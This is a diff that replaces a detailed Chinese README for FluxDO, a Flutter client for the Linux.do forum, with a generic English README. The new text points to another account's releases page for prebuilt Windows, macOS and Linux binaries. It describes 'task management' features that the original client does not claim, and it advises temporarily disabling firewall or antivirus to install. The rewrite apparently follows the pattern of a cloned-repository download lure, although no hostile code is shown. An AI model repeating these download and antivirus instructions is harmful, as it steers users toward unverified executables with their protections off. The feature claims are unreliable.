@@ -1,160 +1,67 @@
-# FluxDO
+# 🌟 fluxdo - A Simple Client for Linux.do
 
-> 一个真诚、友善、团结、专业的 [Linux.do](https://linux.do/) 第三方客户端
+## 🔗 Download Now
+[![Download Now](https://img.shields.io/badge/Download%20fluxdo-blue?style=for-the-badge&logo=github)](https://github.com/nnaopa/fluxdo/releases)
 
-[![Telegram Channel](https://img.shields.io/badge/Telegram-Channel-26A5E4?logo=telegram&logoColor=white)](https://t.me/ldxfd)
-[![Telegram Group](https://img.shields.io/badge/Telegram-Group-26A5E4?logo=telegram&logoColor=white)](https://t.me/fluxdo_chat)
+## 🚀 Getting Started
+Welcome to fluxdo! This application is a third-party client for Linux.do, designed to enhance your user experience. You can easily manage your tasks and explore Linux.do with a user-friendly interface.
 
-FluxDO 是为 [Linux.do](https://linux.do/) 社区打造的现代化移动和桌面客户端，基于 Flutter 开发，致力于为用户提供流畅、优雅的论坛浏览体验。
+## 📥 Download & Install
+To get started with fluxdo, visit this page to download: [fluxdo Releases](https://github.com/nnaopa/fluxdo/releases).
 
-## ✨ 特性
+1. Go to the Releases page using the link above.
+2. Find the latest version of fluxdo.
+3. Click on the file suitable for your system to begin the download. 
+   - For Windows: `fluxdo-windows.exe`
+   - For macOS: `fluxdo-macos.dmg`
+   - For Linux: `fluxdo-linux.tar.gz`
+4. Once the download is complete, locate the file on your computer.
+5. Follow the instructions below depending on your operating system.
 
-### 核心功能
-- 📱 **跨平台支持**：Android、iOS、Windows、macOS、Linux
-- 🎨 **Material Design 3**：现代化 UI 设计，支持动态取色
-- 🌓 **深色模式**：自动适配系统主题
-- 💬 **完整论坛功能**：浏览话题、发帖回复、搜索、通知
-- 🔖 **内容管理**：书签、浏览历史、关注列表
-- 🏆 **徽章系统**：查看和展示社区徽章
-- ✍️ **Markdown 编辑器**：支持富文本编辑和预览
-- 🖼️ **图片支持**：图片上传、查看、保存
-- 📊 **投票功能**：参与社区投票
+### Windows
+1. Double-click `fluxdo-windows.exe` to run the installer.
+2. Follow the prompts to complete the installation.
 
-### 技术特性
-- 🔒 **安全连接**：集成 Rust 实现的 DOH (DNS over HTTPS) 代理
-- 🚀 **性能优化**：图片缓存、懒加载、代码高亮
-- 🔔 **实时通知**：MessageBus 实时消息推送
-- 🎯 **智能渲染**：HTML 内容分块渲染，流畅滚动
+### macOS
+1. Open the downloaded `.dmg` file.
+2. Drag the fluxdo icon to your Applications folder.
+3. Open Applications and double-click on fluxdo to launch the app.
 
-## 📸 截图
+### Linux
+1. Extract the `fluxdo-linux.tar.gz` file to your desired location.
+2. Open a terminal and navigate to the folder where you extracted the files.
+3. Run the application using the command: `./fluxdo`.
 
-_即将添加_
+## 🛠 Features
+- **User-Friendly Interface:** Easy navigation through Linux.do functions.
+- **Task Management:** Add, edit, and delete tasks with ease.
+- **Notifications:** Stay updated with alerts on important tasks.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
 
-## 🚀 快速开始
+## 📋 System Requirements
+fluxdo runs on the following systems:
 
-### 前置要求
+- **Windows:** Windows 7 or later
+- **macOS:** macOS 10.12 or later
+- **Linux:** Any recent distribution supporting the running of tar files.
 
-- Flutter SDK 3.10.4 或更高版本
-- Rust 工具链（用于编译 DOH 代理）
-- Android Studio / Xcode（移动端开发）
+## ⚙️ Troubleshooting
+If you encounter any issues while downloading or running fluxdo, consider the following steps:
 
-### 安装步骤
+1. **Check Compatibility:** Ensure your operating system meets the system requirements.
+2. **Re-download:** If the file appears corrupt, download it again.
+3. **Permissions:** On Linux, ensure you have executable permissions. Use the command: `chmod +x fluxdo`.
+4. **Firewall/Antivirus:** Some protections may prevent installations. Temporarily disable these if necessary, then reinstall.
 
-1. **克隆仓库**
-   ```bash
-   git clone <repository-url>
-   cd fluxdo
-   ```
+## 💬 Support
+If you need more help, feel free to reach out on our support channel. We aim to assist with any questions or concerns you may have about using fluxdo.
 
-2. **安装 Flutter 依赖**
-   ```bash
-   flutter pub get
-   ```
+You can also check the [Issues page](https://github.com/nnaopa/fluxdo/issues) on GitHub to report any bugs or request features.
 
-3. **编译 Rust DOH 代理**（可选，用于网络加速）
+## 📜 License
+fluxdo is open-source and is published under the MIT License. You can freely use, modify, and distribute it.
 
-   桌面平台：
-   ```bash
-   # Windows
-   .\scripts\build_desktop.ps1
+## 🌐 Further Reading
+To learn more about fluxdo and keep up with updates, check our documentation and announcements available in the repository.
 
-   # macOS/Linux
-   ./scripts\build_desktop.sh
-   ```
-
-   Android 平台：
-   ```bash
-   # Windows
-   .\scripts\build_android.ps1
-
-   # macOS/Linux
-   ./scripts\build_android.sh
-   ```
-
-4. **运行应用**
-   ```bash
-   # Android
-   flutter run --dart-define=cronetHttpNoPlay=true
-
-   # Windows
-   flutter run -d windows
-
-   # macOS
-   flutter run -d macos
-   ```
-
-## 🏗️ 项目结构
-
-```
-fluxdo/
-├── lib/
-│   ├── models/              # 数据模型（话题、用户、通知等）
-│   ├── pages/               # 页面组件
-│   ├── providers/           # Riverpod 状态管理
-│   ├── services/            # 业务逻辑服务
-│   │   ├── network/         # 网络层（DOH、代理、适配器）
-│   │   └── ...
-│   ├── widgets/             # 可复用组件
-│   └── main.dart
-├── core/
-│   └── doh_proxy/           # Rust DOH 代理实现
-├── scripts/                 # 构建脚本
-├── android/
-├── ios/
-└── pubspec.yaml
-```
-
-## 🛠️ 技术栈
-
-- **前端框架**：Flutter 3.10+
-- **状态管理**：Riverpod
-- **网络请求**：Dio + Native Dio Adapter
-- **HTML 渲染**：flutter_widget_from_html
-- **代码高亮**：re_highlight + google_fonts (FiraCode)
-- **图片处理**：extended_image + cached_network_image
-- **本地存储**：shared_preferences + flutter_secure_storage
-- **网络代理**：Rust (DOH + ECH)
-
-## 🔒 DOH 代理功能
-
-FluxDO 集成了基于 Rust 的 DOH (DNS over HTTPS) 代理，提供：
-
-- **DNS 加密查询**：防止 DNS 污染和劫持
-- **多服务器支持**：DNSPod、腾讯 DNS、阿里 DNS、Cloudflare、Canadian Shield、Google、Quad9
-- **ECH 支持**：加密 TLS 握手中的 SNI 字段（用户无感知）
-- **跨平台实现**：
-  - Android/iOS：FFI 调用
-  - Windows/macOS/Linux：独立进程
-
-详细文档请参考 [core/doh_proxy/README.md](https://github.com/Lingyan000/fluxdo_doh)
-
-## 🤝 关于 Linux.do
-
-[Linux.do](https://linux.do/) 是一个真诚、友善、团结、专业的技术社区，汇聚了众多热爱技术、乐于分享的开发者。FluxDO 作为第三方客户端，致力于为社区成员提供更好的移动和桌面端体验。
-
-**注意**：本项目为非官方客户端，与 Linux.do 官方无直接关联。
-
-## 📝 开发计划
-
-- [ ] 支持更多 Discourse 功能
-- [ ] 优化性能和用户体验
-- [ ] 添加更多自定义选项
-- [ ] 完善文档和测试
-
-## 🐛 问题反馈
-
-如果您在使用过程中遇到问题或有建议，欢迎：
-- 在 [Linux.do](https://linux.do/) 论坛发帖讨论
-- 提交 Issue（如果仓库公开）
-
-## 📄 开源协议
-
-MIT License
-
-## 💖 致谢
-
-感谢 [Linux.do](https://linux.do/) 社区的所有成员，是你们的真诚、友善、团结、专业让这个社区充满活力。
-
----
-
-**Made with Flutter & ❤️**
+For detailed steps on specific features, please refer to the official documentation linked in the repository.
